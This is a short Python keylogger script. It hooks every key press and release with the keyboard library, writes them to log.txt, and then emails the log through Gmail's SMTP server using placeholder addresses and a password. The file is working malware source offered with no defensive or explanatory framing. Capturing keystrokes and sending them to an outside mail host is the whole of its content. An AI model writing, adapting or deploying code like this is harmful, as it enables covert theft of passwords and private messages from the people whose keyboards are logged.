import os
import keyboard as ky
import time
import smtplib
from email.mime.text import MIMEText

log_file = "log.txt"

def on_key_event(event):
    if event.event_type == "down":
        print(f"Key pressed: {event.name}")
        with open(log_file, "a") as f:
            f.write(f"Key pressed: {event.name}\n")
    elif event.event_type == "up":
        print(f"Key released: {event.name}")
        with open(log_file, "a") as f:
            f.write(f"Key released: {event.name}\n")

ky.hook(on_key_event)
ky.wait()

with open("log.txt") as f:
    content = f.read()

msg = MIMEText(content)
msg["Subject"] = "Recorded Information"
msg["From"] = "your_email@example.com"
msg["To"] = "recipient@example.com"

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login("your_email@example.com", "your_password")
    server.send_message(msg)
